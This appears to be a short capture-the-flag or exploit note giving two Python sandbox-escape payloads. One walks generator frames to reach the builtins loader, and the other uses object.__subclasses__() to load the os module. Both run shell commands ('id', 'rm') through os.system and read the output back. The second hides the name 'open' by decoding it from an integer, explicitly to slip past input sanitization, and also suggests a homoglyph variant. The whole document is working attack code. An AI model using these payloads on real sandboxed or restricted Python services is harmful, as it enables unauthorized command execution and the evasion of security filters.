# Code editor

g = (g.gi_frame.f_back.f_back.f_globals["__builtins__"]["__loader__"].load_module("os").system("id > /tmp/tmp.txt") for _ in [0])
[_ for _ in g]
g = (print(g.gi_frame.f_back.f_back.f_back.f_globals["__builtins__"]["open"]("/tmp/tmp.txt").read()) for _ in [0])
[_ for _ in g]
g = (g.gi_frame.f_back.f_back.f_globals["__builtins__"]["__loader__"].load_module("os").system("rm /tmp/tmp.txt") for _ in [0])
[_ for _ in g]

# Quest

def f(): # fixed
    os = object.__subclasses__()[104].load_module("os") # import os module
    op = object.__subclasses__()[104].load_module("io").__dict__[(1869636974).to_bytes(4, "big").decode()] # "open" is encoded to bypass input sanitization.
    os.system("id > /tmp/test.txt")
    s = op("/tmp/test.txt").read()
    # Alternative (no decoding)
    # s = áµ’pen("/tmp/test.txt").read()
    os.system("rm /tmp/test.txt")
    return s
